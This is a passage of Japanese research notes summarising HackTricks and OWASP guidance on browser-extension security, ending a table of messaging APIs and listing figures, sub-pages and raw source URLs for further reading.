| `chrome.tabs.sendMessage(tabId, ...)` | Background → 特定タブのCS | tabID指定 |
| `chrome.runtime.sendMessage(extensionId, ...)` | 外部Web/拡張 → 拡張 | `externally_connectable` 必須。extension ID必須 |
| `chrome.runtime.onMessageExternal.addListener` / `onConnectExternal.addListener` | 外部受信 | **exact origin equality** で検証必須 |
| `chrome.runtime.sendNativeMessage` / `connectNative` | Background → ネイティブバイナリ | stdio。RCE危険 |

---

## 読者が自分で開くべき資料

本ノートは両URLの**原典Markdown（GitHub上のソース）を全文取得**して作成したため、内容の欠落はない。ただしレンダリング版ホスト（`hacktricks.wiki` / `cheatsheetseries.owasp.org`）は本環境のegress proxyで403ブロックされており、**図・スクリーンショット・レンダリングされたリンク先の別ページ**は取得できていない。読者が自分でブラウザから開く際は、以下を重点的に確認するとよい。

### HackTricks本体ページ（レンダリング版）で見るべきもの

1. **本文中の図(figure)**: 拡張3コンポーネントのアーキテクチャ図（Berkeleyの論文由来）、options ページのアクセス例スクリーンショット、web_accessible_resources のextension-id露出例、Inspect service worker の画面。ノートではalt textのみ再現。
2. **委譲された子ページ（HackTricksの `{{#ref}}` リンク先。本ノートには含まれない別記事）**:
   - `browext-permissions-and-host_permissions.md`（permissions/host_permissionsの悪用の詳細）
   - `browext-clickjacking.md`（web_accessible_resources経由のClickJacking実例）
   - `browext-xss-example.md`（Iframe URL / DOMベースXSSで拡張を侵害する具体例）
   - `../postmessage-vulnerabilities/`（Post Messageバイパスの技法）
   - `../content-security-policy-csp-bypass/`（CSPバイパス）
   - `forced-extension-load-preferences-mac-forgery-windows.md`（WindowsでのPreferences/HMAC偽造による強制拡張読み込み）
3. **参照[13] spaceraccoon「Universal Code Execution in Browser Extensions」**: 任意ページ→RCEの完全な連鎖（content script wildcard → sendMessage → sendNativeMessage → ネイティブ側の危険処理）の実演。
4. **参照[11] koi.ai「ShadowPrompt」**: `externally_connectable` の広い信頼が実在のエージェント型拡張で問題化した実例。
5. **参照[10] redcanary Assemblyline記事**: 悪性更新の静的差分ワークフローの実装詳細。

### OWASPチートシート（レンダリング版）で見るべきもの

1. **各カテゴリの「Mitigation」の言い回し**: ノートで全訳済みだが、開発者に提示する原文英語の推奨文言をそのまま引用したい場合。
2. **リンク先の姉妹チートシート**: [Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) — CSPの nonce/hash ベースポリシーの具体的書き方。
3. **DOM-based Data Skimming (#11) / Prototype-based Data Skimming (#12)**: 比較的新しく追加されたカテゴリ。isolated/main world とprototype pollutionの解説として最新の記述を確認する価値がある。
4. **参照リンク**: [Chrome Extension Security Guide](https://developer.chrome.com/docs/extensions/mv3/security/) と [Firefox Security best practices](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices)（remote scripts禁止の一次情報）。

〔補足（一般知識・取得手段）〕本環境ではレンダリング版が403でも、両資料とも**GitHubの原典**（`HackTricks-wiki/hacktricks` と `OWASP/CheatSheetSeries`）が `raw.githubusercontent.com` から取得できる。読者/後工程が原文を再取得したい場合は、それぞれ次のraw URLが確実:
- HackTricks: `https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/browser-extension-pentesting-methodology/README.md`
- OWASP: `https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.md`
